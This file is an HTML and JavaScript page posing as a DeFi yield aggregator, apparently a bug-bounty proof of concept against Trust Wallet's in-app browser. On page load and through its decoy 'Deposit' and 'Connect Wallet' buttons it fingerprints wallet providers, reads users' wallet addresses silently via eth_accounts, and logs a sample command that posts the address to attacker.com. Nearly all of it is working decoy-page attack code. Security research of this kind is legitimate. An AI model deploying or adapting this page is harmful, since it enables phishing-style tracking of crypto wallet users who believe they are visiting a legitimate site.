<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DeFi Yield Aggregator — Best APY Rates 2026</title>
<style>
  /* LOOKS LIKE A LEGIT DEFI PAGE TO THE USER */

  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0f0f1a; color: #e0e0ff; min-height: 100vh; }
  
  nav { background: #1a1a2e; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #2a2a4a; }
  .logo { font-size: 20px; font-weight: 700; color: #7c6af7; }
  .nav-btn { background: #7c6af7; color: #fff; border: none; border-radius: 8px; padding: 8px 16px; font-size: 14px; cursor: pointer; }
  
  .hero { text-align: center; padding: 60px 24px 40px; }
  .hero h1 { font-size: 32px; font-weight: 800; margin-bottom: 12px; background: linear-gradient(135deg, #7c6af7, #a78bfa); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
  .hero p { color: #9090b0; font-size: 16px; margin-bottom: 32px; }
  
  .cards { display: flex; flex-wrap: wrap; gap: 16px; padding: 0 24px 40px; justify-content: center; max-width: 900px; margin: 0 auto; }
  .card { background: #1a1a2e; border: 1px solid #2a2a4a; border-radius: 16px; padding: 20px; width: 260px; }
  .card-title { font-size: 14px; color: #9090b0; margin-bottom: 8px; }
  .card-apy { font-size: 28px; font-weight: 700; color: #7c6af7; }
  .card-sub { font-size: 12px; color: #6060a0; margin-top: 4px; }
  .card-btn { width: 100%; margin-top: 16px; background: #7c6af720; border: 1px solid #7c6af7; color: #a78bfa; border-radius: 8px; padding: 10px; font-size: 14px; cursor: pointer; }
  
  /* HIDDEN LOG — invisible to user but captures everything */
  #capture-log {
    position: fixed; bottom: 0; left: 0; right: 0;
    background: #0a0a15;
    border-top: 1px solid #1a1a2e;
    max-height: 0;
    overflow: hidden;
    transition: max-height 0.3s;
    font-family: monospace;
    font-size: 11px;
    color: #7c6af7;
    padding: 0 16px;
    z-index: 9999;
  }
  /* Toggle visible for researcher review */
  #capture-log.show { max-height: 300px; overflow-y: auto; padding: 12px 16px; }
  
  .toggle-btn {
    position: fixed; bottom: 16px; right: 16px;
    background: #7c6af7; color: #fff; border: none;
    border-radius: 50%; width: 44px; height: 44px;
    font-size: 18px; cursor: pointer; z-index: 99999;
    box-shadow: 0 4px 12px rgba(124,106,247,0.4);
  }
</style>

<body>

  <div class="card">

    <button class="card-btn">Deposit</button>
  </div>

<!-- RESEARCHER LOG PANEL (hidden from normal users by default) -->
<div id="capture-log">
  <strong style="color:#f0883e">🔴 CAPTURE LOG (Bug Bounty PoC — Tobjosh)</strong><br>
  <div id="log-entries"></div>
</div>

<!-- Toggle button to show/hide log (for researcher to see results) -->
<button class="toggle-btn" onclick="toggleLog()" title="Show capture log">🔍</button>

<script>
// ============================================================
//  STEALTH CAPTURE — runs silently on page load
//  No buttons, no UI — fires automatically
//  Simulates what a real attacker page would do
// ============================================================

const captured = {};
const logEl = document.getElementById('log-entries');

function addLog(msg, color = '#e0e0ff') {
  const ts = new Date().toISOString().substr(11, 12);
  const line = document.createElement('div');
  line.style.cssText = `color:${color};margin:2px 0;padding:2px 0;border-bottom:1px solid #1a1a2e;`;
  line.textContent = `[${ts}] ${msg}`;
  logEl.appendChild(line);
  logEl.scrollTop = logEl.scrollHeight;
  console.log(`[CAPTURE] ${msg}`);
}

function toggleLog() {
  document.getElementById('capture-log').classList.toggle('show');
}

// ============================================================
//  PHASE 1: Passive fingerprinting — no user action needed
//  Runs immediately on page load
// ============================================================
async function phase1_passive() {
  addLog('=== PHASE 1: Passive Fingerprint (no user action) ===', '#7c6af7');

  // Check what wallet objects exist
  const objects = {
    'window.ethereum': window.ethereum,
    'window.trustwallet': window.trustwallet,
    'window.trustProvider': window.trustProvider,
    'window.aptos': window.aptos,
    'window.keplr': window.keplr,
    'window.solana': window.solana,
    'window.createPromise': window.createPromise,
    'window.resolvePromise': window.resolvePromise,
  };

  for (const [name, obj] of Object.entries(objects)) {
    if (obj !== undefined && obj !== null) {
      addLog(`✅ ${name}: ${typeof obj}`, '#7ee787');
      captured[name] = typeof obj;
    }
  }

  // Is it Trust Wallet?
  if (window.ethereum) {
    const isTW = window.ethereum.isTrust || window.ethereum.isTrustWallet;
    addLog(`isTrustWallet: ${isTW}`, isTW ? '#f0883e' : '#8b949e');
    captured.isTrustWallet = isTW;

    // Read selectedAddress (no auth needed — passive)
    const selected = window.ethereum.selectedAddress;
    if (selected) {
      addLog(`🚨 selectedAddress (passive): ${selected}`, '#f85149');
      captured.selectedAddress = selected;
    } else {
      addLog(`selectedAddress: null (not yet connected)`, '#8b949e');
    }

    // Read chainId (no auth needed)
    try {
      const chainId = await window.ethereum.request({ method: 'eth_chainId' });
      addLog(`chainId: ${chainId} (${parseInt(chainId,16)})`, '#58a6ff');
      captured.chainId = chainId;
    } catch(e) {}
  }

  // Read already-connected accounts (no user action needed per EIP-1193)
  if (window.ethereum) {
    try {
      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
      if (accounts && accounts.length > 0) {
        addLog(`🚨 eth_accounts (silent): ${accounts.join(', ')}`, '#f85149');
        captured.accounts_silent = accounts;
      } else {
        addLog(`eth_accounts: [] (not connected yet)`, '#8b949e');
      }
    } catch(e) {
      addLog(`eth_accounts error: ${e.message}`, '#8b949e');
    }
  }

  addLog('--- Phase 1 complete ---', '#7c6af7');
  return captured;
}

// ============================================================
//  PHASE 2: Active capture — triggers eth_requestAccounts
//  This is what happens when user taps "Connect Wallet" on 
//  a real malicious DeFi page — totally expected UX action
// ============================================================
async function phase2_connect() {
  addLog('=== PHASE 2: Active Connect (triggered by user tap) ===', '#7c6af7');

  if (!window.ethereum) {
    addLog('No ethereum provider — not in Trust Wallet browser', '#f0883e');
    return;
  }

  try {
    const t0 = performance.now();
    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
    const elapsed = Math.round(performance.now() - t0);

    if (accounts && accounts.length > 0) {
      addLog(`🚨 CONNECTED in ${elapsed}ms`, '#f85149');
      addLog(`   Address: ${accounts[0]}`, '#f85149');
      addLog(`   ${elapsed < 500 ? 'INSTANT — no dialog? CHECK THIS' : 'User approved dialog (' + elapsed + 'ms)'}`, elapsed < 500 ? '#f85149' : '#7ee787');
      captured.address = accounts[0];
      captured.connect_ms = elapsed;

      // Now get chain info with auth
      try {
        const chainId = await window.ethereum.request({ method: 'eth_chainId' });
        const netV = await window.ethereum.request({ method: 'net_version' });
        addLog(`   ChainID: ${chainId} | Network: ${netV}`, '#58a6ff');
        captured.chainId = chainId;
      } catch(e) {}

      // Simulate what attacker does: save address, track wallet
      addLog(`📡 [ATTACKER WOULD]: POST address to server`, '#d29922');
      addLog(`   fetch('https://attacker.com/track', {method:'POST', body: JSON.stringify({addr:'${accounts[0]}', chain:${parseInt(captured.chainId||'0x1',16)}})})`, '#8b949e');

    } else {
      addLog('No accounts returned', '#8b949e');
    }
  } catch(e) {
    if (e.code === 4001) {
      addLog('✅ User rejected — dialog was shown (secure behavior)', '#7ee787');
    } else {
      addLog(`Error: ${e.message}`, '#f85149');
    }
  }
  addLog('--- Phase 2 complete ---', '#7c6af7');
}

// ============================================================
//  PHASE 3: Post-connect passive read
//  After connecting once, EVERY future visit can silently read
//  the address using eth_accounts — no dialog ever again
// ============================================================
async function phase3_post_connect() {
  addLog('=== PHASE 3: Post-Connect Silent Read ===', '#7c6af7');
  addLog('(Simulates a RETURN VISIT — user already connected before)', '#8b949e');

  if (!window.ethereum) return;

  // eth_accounts = returns connected accounts WITHOUT any dialog
  // This is the "permanent tracking" vector
  try {
    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
    if (accounts && accounts.length > 0) {
      addLog(`🚨 SILENT READ on return visit: ${accounts[0]}`, '#f85149');
      addLog(`   No dialog. No permission. Address just returned.`, '#f85149');
      addLog(`   User has no idea this happened.`, '#d29922');
      captured.silent_return_address = accounts[0];
    } else {
      addLog('eth_accounts empty — not connected on this visit', '#8b949e');
    }
  } catch(e) {}

  // Also check all other providers silently
  if (window.aptos) {
    try {
      const aptosAccount = await window.aptos.account();
      if (aptosAccount) {
        addLog(`🚨 Aptos address: ${JSON.stringify(aptosAccount)}`, '#f85149');
        captured.aptos_address = aptosAccount;
      }
    } catch(e) {}
  }

  if (window.keplr) {
    addLog(`ℹ️ window.keplr exists — Cosmos chains accessible`, '#58a6ff');
  }

  addLog('--- Phase 3 complete ---', '#7c6af7');
  showSummary();
}

// ============================================================
//  SUMMARY
// ============================================================
function showSummary() {
  addLog('', '#7c6af7');
  addLog('=== 📋 CAPTURE SUMMARY ===', '#f0883e');
  
  const hasBug = captured.address || captured.accounts_silent?.length > 0 || captured.silent_return_address;
  
  if (captured.isTrustWallet) addLog('✅ Running inside Trust Wallet', '#7ee787');
  if (captured.address) addLog(`🚨 Wallet: ${captured.address}`, '#f85149');
  if (captured.chainId) addLog(`🔗 Chain: ${captured.chainId} (ID: ${parseInt(captured.chainId, 16)})`, '#58a6ff');
  if (captured.connect_ms) addLog(`⏱️ Connect time: ${captured.connect_ms}ms`, captured.connect_ms < 500 ? '#f85149' : '#7ee787');
  if (captured.silent_return_address) addLog(`🚨 Silent return-visit read: ${captured.silent_return_address}`, '#f85149');
  
  addLog('', '#7c6af7');
  if (hasBug) {
    addLog('🔴 FINDING: Wallet address exposed to this domain', '#f85149');
    addLog('   Once user connects, ANY subsequent visit reads address silently', '#f85149');
    addLog('   No re-confirmation. No revocation UI visible to user.', '#d29922');
  } else {
    addLog('ℹ️ No address captured yet — tap Connect Wallet button', '#8b949e');
  }
  
  addLog(`Full data: ${JSON.stringify(captured)}`, '#8b949e');
}

// ============================================================
//  WIRE UP "Connect Wallet" BUTTON ON THE DECOY UI
//  When user taps the legit-looking button, phase 2 runs
// ============================================================
document.querySelector('.nav-btn').addEventListener('click', async () => {
  document.getElementById('capture-log').classList.add('show');
  await phase2_connect();
  await phase3_post_connect();
});

// Also wire "Deposit" buttons to trigger connect
document.querySelectorAll('.card-btn').forEach(btn => {
  btn.addEventListener('click', async () => {
    document.getElementById('capture-log').classList.add('show');
    addLog(`User clicked "Deposit" — triggering connect flow`, '#d29922');
    await phase2_connect();
    await phase3_post_connect();
  });
});

// ============================================================
//  AUTO-RUN PHASE 1 immediately on load (fully passive)
//  Phase 2 & 3 triggered by user tapping a button (normal UX)
// ============================================================
window.addEventListener('load', async () => {
  await phase1_passive();

  // After 2 seconds, silently try phase3 
  // (catches users who already connected this site before)
  setTimeout(async () => {
    const accounts = await window.ethereum?.request({ method: 'eth_accounts' }).catch(() => []);
    if (accounts && accounts.length > 0) {
      document.getElementById('capture-log').classList.add('show');
      addLog(`🚨 RETURN VISITOR DETECTED — already connected!`, '#f85149');
      await phase3_post_connect();
    }
  }, 2000);
});
</script>
